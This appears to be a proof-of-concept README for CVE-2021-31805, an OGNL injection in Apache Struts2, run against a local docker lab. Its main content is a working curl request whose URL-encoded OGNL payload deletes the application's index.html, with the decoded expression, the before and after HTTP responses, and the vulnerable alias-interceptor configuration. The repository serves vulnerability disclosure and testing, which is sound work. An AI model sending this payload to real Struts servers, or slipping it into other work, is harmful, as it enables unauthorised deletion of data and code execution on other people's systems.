# CVE-2021-31805
PoC for CVE-2021-31805 (Apache Struts2)

## Test

### Set up the PoC environment

```
$ docker-compose build
$ docker-compose up -d
```

### Confirm it works
See http://localhost:18080/struts2-showcase-2.5.29/index.html and make sure the Welcome page is shown.

### Exploit

```
$ curl -I 'http://localhost:18080/struts2-showcase-2.5.29/index.html'
HTTP/1.1 200
(snip)
$ curl -I 'http://localhost:18080/struts2-showcase-2.5.29/skill/list.action?name=%23%61%70%70%6c%69%63%61%74%69%6f%6e%5b%27%6f%72%67%2e%61%70%61%63%68%65%2e%63%61%74%61%6c%69%6e%61%2e%72%65%73%6f%75%72%63%65%73%27%5d%2e%67%65%74%52%65%73%6f%75%72%63%65%28%27%2f%69%6e%64%65%78%2e%68%74%6d%6c%27%29%2e%64%65%6c%65%74%65%28%29'
HTTP/1.1 200
(snip)
decoded query is name=#application['org.apache.catalina.resources'].getResource('/index.html').delete()

$ curl -I 'http://localhost:18080/struts2-showcase-2.5.29/index.html'
HTTP/1.1 404
(snip)
The index.html file has been deleted.
```

## Exploit Requirements
- Double evaluations in Struts configurations
- Double evaluation results in Struts tags
@see https://securitylab.github.com/research/apache-struts-double-evaluation/

## Example Vulnerable Code
```
<action name="list" class="org.apache.struts2.showcase.action.SkillAction" method="list">
    <param name="aliases">#{#parameters['name'][0] : 'skillName'}</param>
    <interceptor-ref name="alias"/>
    <interceptor-ref name="params" />
    <interceptor-ref name="basicStack"/>
    <result>/WEB-INF/empmanager/listSkills.jsp</result>
</action>
```

## References
- https://securitylab.github.com/research/apache-struts-double-evaluation/
- https://github.com/apache/struts/commit/e1209fde05a34b28e747f1fa858c82d2a32cb018
- https://struts.apache.org/core-developers/alias-interceptor.html
- https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.30

## Author
Masato Anzai
```
